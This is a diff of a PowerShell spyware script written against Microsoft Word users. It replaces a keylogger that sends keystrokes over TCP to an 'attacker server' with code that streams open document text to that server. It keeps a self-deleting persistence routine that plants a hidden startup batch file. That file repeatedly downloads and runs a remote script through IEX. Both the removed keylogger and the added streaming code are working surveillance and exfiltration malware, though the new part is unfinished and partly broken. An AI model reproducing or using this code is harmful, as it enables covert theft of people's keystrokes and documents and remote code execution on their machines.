@@ -1,18 +1,12 @@
 ﻿<#
+    TODO:
+    - complete StreamText scriptblock
+    - server logger (python? each connection to each output text file)
+    - clean code, add code comments and finish README (markdown)
+#>
+
+<#
 .SYNOPSIS
-
-This script runs a key logger that records keypresses while user has opened Microsoft Word.
-After the key press has been captured, its being sent to attacker server through TCP session.
-This script has also persistency function, spawning a batch file in user's startup folder.
-
-Tested on: Windows 10, Windows Defender Real-Time Protection DISABLED
-Author: Daniel Wolfman
-
-.NOTES
-
-References:
-https://www.facebook.com/KaliPentesting/posts/2022916778002372
-
 
 #>
 
@@ -22,133 +16,119 @@ $LOG_PORT = 8888
 $HTTP_PORT = 8000
 $TARGET_PROCESS = "WINWORD"
 
-$Keylogger =
-{
-  <#
-  .SYNOPSIS
-  
-  This script creates TCP socket to attacker's server, capturing keypresses with user32.dll functions and sending them through the socket.
-  #>
-
-  param($Server, $Port)
-
-  # Signatures for API Calls
-  $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
-
-  # load signatures and make members available
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-    
-  # create TCP socket to server
-  while(1) {
-    Try 
-    {
-        $Socket = New-Object -TypeName System.Net.Sockets.TcpClient
-        $Socket.Connect($Server, $Port)
-        break
-    }
-    Catch 
-    {
-        sleep 3
-    }
-  }
-  # Setup stream writer 
-  $Stream = $Socket.GetStream() 
-  $Writer = New-Object System.IO.StreamWriter($Stream)
-  $Writer.AutoFlush = $true
-
-  $Writer.WriteLine("--------- " + (Get-Date -Format "[MM/dd/yyyy HH:mm:ss]") + " ---------")
-
-  while ($true) {
-      Start-Sleep -Milliseconds 40
-      
-      # scan all ASCII codes above 8
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        # get current key state
-        $state = $API::GetAsyncKeyState($ascii)
-
-        # is key pressed?
-        if ($state -eq -32767) {
-          $null = [console]::CapsLock
-
-          # translate scan code to real code
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-          # get keyboard state for virtual keys
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
-
-          # prepare a StringBuilder to receive input key
-          $mychar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-          if ($success) 
-          {
-            $Writer.Write($mychar)
-          }
-        }
-      }
-    }
-}
-
 Function Invoke-Persistency {
     <#
     .SYNOPSIS
     
-    This function generates a powershell one-liner and creates a bat file in the user startup folder.
+    
     #>
+
+    # self destruction (on disk)
+    del $PSScriptRoot 2>$null
+    
     "CONSOLESTATE /Hide`npowershell -nop -w 1 -exec bypass -c ""while(1){try{IEX (New-Object Net.WebClient).DownloadString('http://$SERVER`:$HTTP_PORT/script.ps1');exit} catch{sleep 5}}""" > "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
+}
+
+Function Wait-ForWord {
+    Write-Host "[~] Waiting for Microsoft Word document to be opened" -ForegroundColor Gray
+    
+    while(1) {
+        try {
+            $word = ([Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application'))
+            Write-Host '[+]' $word.UserName 'opened Word!' -ForegroundColor Green
+            break
+        }
+        catch { sleep 1 }
+    }
+    return $word
+}
+
+function diffstrs {param($a, $b) ($b.ToCharArray() | ?{$a.ToCharArray() -notcontains $_}) -join "" }
+
+$StreamText = {
+    <#
+    todo:
+        - check if this scriptblock works with single doc to remote server
+        - complete streamwritter functionality (new lines, backspaces, etc')
+            (check about StreamWriter in MSDN)
+        - add socket closing properly
+    #>
+    param($doc, $server, $port)
+
+    # create TCP socket to server
+    "trying to connect server"
+    while(1) {
+        try 
+        {
+            $socket = New-Object -TypeName System.Net.Sockets.TcpClient
+            $socket.Connect($SERVER, $PORT)
+            break
+        }
+        catch 
+        {
+            sleep 3
+        }
+    }
+    Write-Host "connected"
+    # Setup stream writer 
+    $Stream = $Socket.GetStream() 
+    $Writer = New-Object System.IO.StreamWriter($Stream)
+    $Writer.AutoFlush = $true
+
+    $Writer.WriteLine("--------- " + (Get-Date -Format "[MM/dd/yyyy HH:mm]") + " - " + $doc.FullName + " ---------")
+
+    $content = $doc.Range().text
+    
+    while($new_content = $doc.Range().text) {
+        # get diff
+        $diff = diffstrs $content $new_content 
+        if ($diff) {
+            $Writer.Write()
+        }
+    }
+
+
+    ($b.ToCharArray() | ?{$a.ToCharArray() -notcontains $_}) -join ""
+
+
 }
 
 Function Monitor-Word {
     <#
     .SYNOPSIS
     
-    Main function that starts with self destruction of the script on disk,
-    then running infinite loop, monitoring the processes to check if Microsoft Word is active or not.
-    While active, running keylogger function.
     #>
+    
+    $active_docs_count = 0
 
-    # self destruction (on disk)
-    del $PSScriptRoot 2>$null
+    while (1) {
 
-    $running = $false
-    $job = $null
+        # Wait for Word to be opened
+        $word = Wait-ForWord
 
-    Write-Host "[~] Starting monitoring" -ForegroundColor Yellow
-    # infinite loop for monitoring process activity
-    while ($true) {
-        # try to get Word process instance
-        $process = Get-Process | ?{$_.ProcessName -eq $TARGET_PROCESS}
+        # while Word has active documents opened
+        while(($word.Documents.Count -gt 0)) {
+            # check if new document opened
+            if ($word.Documents.Count -gt $active_docs_count) {
+                # iterate through all new documents
+                for ($i = 1 ; $i -le ($word.Documents.Count - $active_docs_count) ; $i++) {
+                    # start streaming job
+                    Write-Host '[*] Starting text streaming of ' $word.Documents[$i].Name -ForegroundColor Yellow
+                    Start-Job -ScriptBlock $StreamText -ArgumentList ($word.Documents[$i], $SERVER, $LOG_PORT)
+                    $active_docs_count += 1
+                }
+            }
+        
+            # check if one of the documents has been closed
+            if ($word.Documents.Count -lt $active_docs_count) {
+                $active_docs_count -= 1
+            }
 
-        # if it has been opened, start logger
-        if ($process -and !$running) {
-            $running = $true
-            Write-Host "[+] Word opened!" -ForegroundColor Green
-            $job = Start-Job -ScriptBlock $Keylogger -ArgumentList $SERVER, $LOG_PORT
+            sleep 1
         }
-
-        # if it has been closed, stop logger
-        if(!$process -and $running) {
-            $running = $false
-            Write-Host "[-] Word has been closed. stopping logger." -ForegroundColor Gray
-            Stop-Job $job
-            Remove-Job $job
-        }        
-
-        Start-Sleep -Seconds 2
     }
+    
 }
 
-Invoke-Persistency
+#Invoke-Persistency
 Monitor-Word
